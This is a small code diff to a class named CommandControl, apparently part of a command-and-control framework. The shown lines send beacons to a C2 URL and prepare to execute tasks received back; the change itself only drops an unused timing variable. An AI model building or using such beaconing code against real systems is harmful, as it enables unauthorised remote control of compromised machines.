@@ -139,7 +139,7 @@ class CommandControl:
                 self.logger.debug(f"[Beacon {beacon_id}] Sending {method} beacon to {c2_url}")
                 response = None
                 task_to_execute = None # Variable to hold received task
-                start_time = time.time()
+                time.time()
                 try:
                     if method == "POST":
                         response = requests.post(c2_url, headers=headers, json=beacon_data,
